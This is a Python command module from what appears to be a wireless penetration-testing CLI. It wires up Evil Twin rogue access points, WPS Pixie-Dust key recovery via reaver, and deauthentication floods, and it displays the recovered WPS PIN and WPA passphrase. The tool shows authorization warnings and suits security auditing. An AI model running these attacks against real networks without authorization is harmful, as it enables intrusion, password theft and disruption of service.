import asyncio
import time
from swcli.repl.palette import Command, CommandPalette
from swcli.repl.prompts import prompt_text, prompt_mac, prompt_channel, prompt_confirm, prompt_choice
from swcli.repl.session_ui import auto_fill_prompt
from sidewinder.attacks.evil_twin import EvilTwinEngine
from sidewinder.attacks.wps import WPSEngine
from sidewinder.core.attack import AttackConfig
from sidewinder.core.subprocess_mgr import get_manager
from rich.live import Live
from rich.console import Group
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich import box
from swcli.repl.renderer import build_handshake_progress_panel, console, print_success, print_error, print_warning


async def _select_monitor_iface(repl):
    from sidewinder.core.adapter import list_interfaces, get_interface_mode, detect_adapter

    monitor_ifaces = []
    for iface_name in list_interfaces():
        if get_interface_mode(iface_name) == "monitor":
            chip = await detect_adapter(iface_name)
            chip_str = f" ({chip.chipset})" if (chip and chip.chipset) else ""
            monitor_ifaces.append((iface_name, chip_str))

    if not monitor_ifaces:
        print_error("No monitor interfaces found. Run /monitor first.")
        return None

    if len(monitor_ifaces) == 1:
        iface = monitor_ifaces[0][0]
        repl.print(f"  Using monitor interface: [cyan]{iface}[/cyan]{monitor_ifaces[0][1]}")
        return iface

    choices = [f"{name}{chip}" for name, chip in monitor_ifaces]
    res = prompt_choice("Select monitor interface", choices)
    if res.cancelled:
        return None
    return res.value.split(" ")[0]


def _target_label(net):
    flags = []
    if net.wps:
        flags.append("WPS")
    if net.eapol:
        flags.append("EAPOL")
    flags_text = f" [{', '.join(flags)}]" if flags else ""
    return f"{net.display_name()} ({net.bssid}) - Ch {net.channel} [signal: {net.signal} dBm]{flags_text}"


def _target_summary(title, rows):
    table = Table.grid(padding=(0, 2))
    table.add_column(style="cyan", no_wrap=True)
    table.add_column(style="white")
    for key, value in rows:
        table.add_row(key, str(value))
    return Panel(table, title=title, border_style="bright_blue", box=box.ROUNDED, padding=(0, 1))


async def _select_network_target(repl, *, purpose, wps_only=False):
    selected = getattr(repl.session, "selected_target", None)
    scan_results = list(repl.session.scan_results or [])

    choices = []
    target_map = {}
    if selected:
        label = f"Use active target: {_target_label(selected)}"
        choices.append(label)
        target_map[label] = selected

    if wps_only:
        candidates = sorted(scan_results, key=lambda n: (not n.wps, n.display_name().lower()))
    else:
        candidates = scan_results
    for net in candidates:
        if selected and net.bssid.upper() == selected.bssid.upper():
            continue
        label = _target_label(net)
        choices.append(label)
        target_map[label] = net

    choices.append("Enter target manually")

    if len(choices) > 1:
        res = prompt_choice(f"Select {purpose} target", choices)
        if res.cancelled:
            return None
        if res.value != "Enter target manually":
            net = target_map[res.value]
            repl.session.selected_target = net
            repl.session.last_bssid = net.bssid
            repl.session.last_channel = net.channel
            return net

    bssid_res = prompt_mac(*auto_fill_prompt(repl.session, "bssid", "Target BSSID"))
    if bssid_res.cancelled:
        return None
    ch = repl.session.get_channel_for_bssid(bssid_res.value)
    ch_res = prompt_channel("Channel", default=ch or repl.session.last_channel or 6)
    if ch_res.cancelled:
        return None
    return type("ManualTarget", (), {
        "bssid": bssid_res.value,
        "channel": ch_res.value,
        "signal": -1,
        "wps": False,
        "eapol": False,
        "display_name": lambda self: "[MANUAL]",
    })()


def _attack_progress_panel(title, target_rows, logs, elapsed):
    table = Table.grid(padding=(0, 2))
    table.add_column(style="cyan", no_wrap=True)
    table.add_column(style="white")
    for key, value in target_rows:
        table.add_row(key, str(value))

    log_text = Text()
    if logs:
        for line in logs[-8:]:
            log_text.append(line[-120:] + "\n", style="dim")
    else:
        log_text.append("Waiting for tool output...", style="dim")

    status = Text()
    status.append("Elapsed ", style="dim")
    status.append(f"{int(elapsed)}s", style="bold white")
    status.append("  Press Ctrl+C to stop", style="dim")

    return Panel(
        Group(table, Text(""), log_text, Text(""), status),
        title=title,
        border_style="bright_cyan",
        box=box.ROUNDED,
        padding=(0, 1),
    )


async def cmd_evil_twin(repl):
    iface = await _select_monitor_iface(repl)
    if not iface:
        return

    target = await _select_network_target(repl, purpose="Evil Twin")
    if not target:
        return

    default_essid = "" if target.display_name() in ("[HIDDEN]", "[MANUAL]") else target.display_name()
    essid_res = prompt_text("ESSID to broadcast", default=default_essid)
    if essid_res.cancelled:
        return
    if not essid_res.value.strip():
        print_error("ESSID is required for Evil Twin.")
        return

    clone_bssid = ""
    if getattr(target, "bssid", ""):
        clone_res = prompt_confirm("Clone target BSSID in rogue AP beacon?")
        if clone_res.cancelled:
            return
        if clone_res.value:
            clone_bssid = target.bssid

    console.print(_target_summary("Evil Twin Plan", [
        ("Interface", iface),
        ("ESSID", essid_res.value),
        ("Channel", target.channel),
        ("Clone BSSID", clone_bssid or "no"),
        ("Source", "scan/session" if target.display_name() != "[MANUAL]" else "manual"),
    ]))
    print_warning("Evil Twin starts a rogue AP. Use only in an authorized lab or audit scope.")
    conf = prompt_confirm("Start Evil Twin?")
    if conf.cancelled or not conf.value:
        return

    engine = EvilTwinEngine(get_manager())
    logs = []
    start = time.monotonic()

    def on_log(line):
        logs.append(line)

    try:
        with Live(
            _attack_progress_panel("Evil Twin", [
                ("Interface", iface),
                ("ESSID", essid_res.value),
                ("Channel", target.channel),
                ("BSSID", clone_bssid or "generated"),
            ], logs, 0),
            console=console,
            refresh_per_second=4,
            transient=False,
        ) as live:
            task = asyncio.create_task(engine.start_rogue_ap(
                mon_iface=iface,
                essid=essid_res.value,
                channel=target.channel,
                target_bssid=clone_bssid or None,
                on_log=on_log,
            ))
            while not task.done():
                live.update(_attack_progress_panel("Evil Twin", [
                    ("Interface", iface),
                    ("ESSID", essid_res.value),
                    ("Channel", target.channel),
                    ("BSSID", clone_bssid or "generated"),
                ], logs, time.monotonic() - start), refresh=True)
                await asyncio.sleep(0.25)
            ok = await task
        if ok:
            print_success("Evil Twin session ended.")
        else:
            print_warning("Evil Twin stopped before a successful completion signal.")
    except KeyboardInterrupt:
        await engine.stop()
        repl.print("  [yellow]Evil Twin stopped.[/yellow]")

async def cmd_wps(repl):
    iface = await _select_monitor_iface(repl)
    if not iface:
        return

    target = await _select_network_target(repl, purpose="WPS", wps_only=True)
    if not target:
        return

    if not getattr(target, "wps", False):
        print_warning("Selected target was not marked WPS-enabled in scan data. Reaver may fail quickly.")

    console.print(_target_summary("WPS Pixie-Dust Plan", [
        ("Interface", iface),
        ("Target", f"{target.display_name()} ({target.bssid})"),
        ("Channel", target.channel),
        ("WPS in scan", "yes" if getattr(target, "wps", False) else "unknown/no"),
        ("Tool", "reaver -K 1"),
    ]))
    print_warning("WPS attacks can trigger AP lockouts. Use only with authorization.")
    conf = prompt_confirm("Start WPS Pixie-Dust?")
    if conf.cancelled or not conf.value:
        return

    engine = WPSEngine(get_manager())
    cfg = AttackConfig(target_bssid=target.bssid, channel=target.channel)
    logs = []
    start = time.monotonic()

    def on_progress(**kwargs):
        status = kwargs.get("status")
        if status:
            logs.append(status)

    try:
        engine.set_progress_callback(on_progress)
        with Live(
            _attack_progress_panel("WPS Pixie-Dust", [
                ("Interface", iface),
                ("Target", target.bssid),
                ("Channel", target.channel),
            ], logs, 0),
            console=console,
            refresh_per_second=4,
            transient=False,
        ) as live:
            task = asyncio.create_task(engine.start(cfg, iface=iface))
            while not task.done():
                live.update(_attack_progress_panel("WPS Pixie-Dust", [
                    ("Interface", iface),
                    ("Target", target.bssid),
                    ("Channel", target.channel),
                ], logs, time.monotonic() - start), refresh=True)
                await asyncio.sleep(0.25)
            res = await task
        if res.success:
            print_success(f"WPS Attack Succeeded!\n  PIN: {res.stats.get('wps_pin')}\n  PSK: {res.stats.get('wpa_psk')}")
        else:
            print_error("WPS Attack Failed.")
    except KeyboardInterrupt:
        await engine.stop()
        repl.print("  [yellow]WPS attack stopped.[/yellow]")

async def cmd_deauth(repl):
    from swcli.repl.commands.capture import _get_deauth_params
    params = await _get_deauth_params(repl, default_count=50)
    if not params: return
    iface, bssid, channel, client, count = params
    
    conf = prompt_confirm("Start Deauth Attack?")
    if conf.cancelled or not conf.value: return
    
    from sidewinder.core.capture import capture_deauth
    repl.print("\n  [cyan]Sending Deauth frames...[/cyan]")
    start = time.monotonic()
    state = {"m1": False, "m2": False, "m3": False, "m4": False, "status": "sending", "activity": "|", "analysis_passes": 0}
    activity_frames = ("|", "/", "-", "\\")
    done = False

    def render():
        return build_handshake_progress_panel(
            title="Deauth Attack",
            iface=iface,
            bssid=bssid,
            client=client,
            channel=channel,
            count=count,
            elapsed=time.monotonic() - start,
            **state,
        )

    async def animate(live):
        idx = 0
        while not done:
            state["activity"] = activity_frames[idx % len(activity_frames)]
            state["analysis_passes"] += 1
            live.update(render(), refresh=True)
            idx += 1
            await asyncio.sleep(0.25)

    with Live(render(), console=console, refresh_per_second=6, transient=False) as live:
        anim_task = asyncio.create_task(animate(live))
        def on_progress(m1, m2, m3, m4, status):
            state.update({"m1": m1, "m2": m2, "m3": m3, "m4": m4, "status": status})
            live.update(render(), refresh=True)

        try:
            await capture_deauth(
                mon_iface=iface,
                bssid=bssid,
                client=client,
                channel=channel,
                output_prefix="/tmp/swcli_attack_deauth",
                count=count,
                timeout=10,
                on_progress=on_progress,
            )
        finally:
            done = True
            anim_task.cancel()
            try:
                await anim_task
            except asyncio.CancelledError:
                pass
        live.update(render(), refresh=True)
    print_success("Deauth frames sent.")

def register_commands(palette: CommandPalette):
    palette.register(Command("/attack evil-twin", "Evil Twin AP", "Attack", cmd_evil_twin))
    palette.register(Command("/attack wps", "WPS Pixie-Dust", "Attack", cmd_wps))
    palette.register(Command("/attack deauth", "Deauth Attack", "Attack", cmd_deauth))
